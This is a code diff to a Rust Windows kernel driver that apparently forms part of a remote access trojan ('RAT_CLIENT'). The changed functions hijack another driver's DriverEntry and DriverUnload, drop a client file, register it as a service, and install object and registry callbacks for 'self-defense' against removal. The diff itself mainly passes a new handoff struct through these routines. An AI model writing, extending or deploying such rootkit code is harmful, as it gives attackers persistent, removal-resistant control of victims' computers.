@@ -4,6 +4,7 @@ use core::sync::atomic::Ordering;
 use core::{mem, ptr, slice};
 
 use aho_corasick::AhoCorasickBuilder;
+use rat_common::kernel::KernelHandoff;
 use rat_common::utils::DropGuard;
 use wdk::{self, nt_success};
 use wdk_sys::_MODE::KernelMode;
@@ -21,9 +22,9 @@ use widestring::{U16CStr, Utf16Str, u16cstr};
 
 use crate::global::{
     CM_REGISTER_CALLBACK_COOKIE, DOS_NAME, MAX_INITIALIZE_ATTEMPTS, OB_REGISTER_CALLBACKS_HANDLE,
-    ORIGINAL_DRIVER_UNLOAD, RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_SERVICE_PATH,
-    RAT_CLIENT_SERVICE_REGISTRY, RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE,
-    SERVICE_REGISTRY_AHO_CORASICK,
+    ORIGINAL_DRIVER_ENTRY_COMPLETED, ORIGINAL_DRIVER_OBJECT, ORIGINAL_DRIVER_UNLOAD, RAT_CLIENT,
+    RAT_CLIENT_OBJ_PATH, RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY,
+    RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE, SERVICE_REGISTRY_AHO_CORASICK,
 };
 use crate::handlers::registry::cm_register_callback;
 use crate::handlers::{irp, object};
@@ -33,8 +34,8 @@ use crate::{error, info, warn};
 
 type DriverUnloadFn = unsafe extern "C" fn(driver: PDRIVER_OBJECT);
 
-unsafe extern "C" fn initialize_thread_routine(driver: *mut c_void) {
-    let driver = driver.cast();
+unsafe extern "C" fn initialize_thread_routine(extra: *mut c_void) {
+    let extra = unsafe { Box::from_raw(extra.cast()) };
     let mut sleep = LARGE_INTEGER { QuadPart: -3000000 };
 
     for retry in 0..MAX_INITIALIZE_ATTEMPTS {
@@ -48,7 +49,7 @@ unsafe extern "C" fn initialize_thread_routine(driver: *mut c_void) {
             break;
         }
 
-        if initialize(driver).is_ok() {
+        if initialize(&extra).is_ok() {
             break;
         }
     }
@@ -127,7 +128,7 @@ fn drop_file() -> anyhow::Result<()> {
     Ok(())
 }
 
-fn initialize(driver: PDRIVER_OBJECT) -> anyhow::Result<()> {
+fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
     let mut success = true;
     match drop_file() {
         Ok(_) => match setup_service_registry(RAT_CLIENT_SERVICE_PATH) {
@@ -143,7 +144,7 @@ fn initialize(driver: PDRIVER_OBJECT) -> anyhow::Result<()> {
         }
     }
 
-    match object::ob_register_callbacks() {
+    match object::ob_register_callbacks(extra) {
         Ok(handle) => {
             info!("Registered object callbacks");
 
@@ -184,6 +185,7 @@ fn initialize(driver: PDRIVER_OBJECT) -> anyhow::Result<()> {
         }
     }
 
+    let driver = ORIGINAL_DRIVER_OBJECT.load(Ordering::Acquire);
     match cm_register_callback(driver) {
         Ok(cookie) => {
             info!("Registered registry callbacks");
@@ -260,7 +262,7 @@ fn remove_registered_services(driver: PDRIVER_OBJECT) {
 }
 
 unsafe extern "C" fn driver_unload(driver: PDRIVER_OBJECT) {
-    info!("DriverUnload: {driver:p}");
+    info!("DriverUnload: driver={driver:p}");
     let old_driver_unload_ptr = ORIGINAL_DRIVER_UNLOAD.load(Ordering::Acquire);
     if !old_driver_unload_ptr.is_null() {
         unsafe {
@@ -276,10 +278,12 @@ unsafe extern "C" fn driver_unload(driver: PDRIVER_OBJECT) {
 pub fn driver_entry_prehook(
     driver: PDRIVER_OBJECT,
     registry_path: Option<&Utf16Str>,
+    extra: &KernelHandoff,
 ) -> anyhow::Result<()> {
-    info!("DriverEntry: {driver:p}, {registry_path:?}");
+    info!("DriverEntry: driver={driver:p}, registry_path={registry_path:?}");
     let mut thread = ptr::null_mut();
 
+    ORIGINAL_DRIVER_OBJECT.store(driver, Ordering::Release);
     let status = unsafe {
         PsCreateSystemThread(
             &mut thread,
@@ -288,7 +292,7 @@ pub fn driver_entry_prehook(
             ptr::null_mut(),
             ptr::null_mut(),
             Some(initialize_thread_routine),
-            driver.cast(),
+            Box::into_raw(Box::new(extra.clone())).cast(),
         )
     };
     anyhow::ensure!(
@@ -303,8 +307,11 @@ pub fn driver_entry_posthook(
     driver: PDRIVER_OBJECT,
     _: Option<&Utf16Str>,
     status: NTSTATUS,
+    _: &KernelHandoff,
 ) -> anyhow::Result<()> {
     info!("Original DriverEntry returned with status: 0x{status:X}");
+    ORIGINAL_DRIVER_ENTRY_COMPLETED.store(true, Ordering::Release);
+
     if let Some(driver) = unsafe { driver.as_mut() } {
         if let Some(unload) = driver.DriverUnload {
             ORIGINAL_DRIVER_UNLOAD.store(unload as *mut u8, Ordering::Release);
